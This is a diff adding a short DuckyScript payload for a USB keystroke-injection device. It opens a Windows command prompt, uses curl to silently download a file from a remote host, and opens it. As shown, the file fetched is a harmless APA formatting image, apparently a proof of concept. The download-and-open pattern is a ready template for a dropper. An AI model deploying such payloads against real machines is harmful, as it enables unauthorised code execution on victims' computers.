@@ -1,0 +1,16 @@
+REM File Downloader 1.0
+REM Hayden Sapp
+REM 2024-04-08
+
+REM Set attackmode
+ATTACKMODE HID
+DELAY 2000
+
+GUI r
+DELAY 500
+STRINGLN cmd
+
+DELAY 2000
+STRINGLN curl -sLo test.png https://owl.purdue.edu/owl/research_and_citation/apa_style/apa_formatting_and_style_guide/images/20200129APATable1.png
+DELAY 2000
+STRINGLN test.png
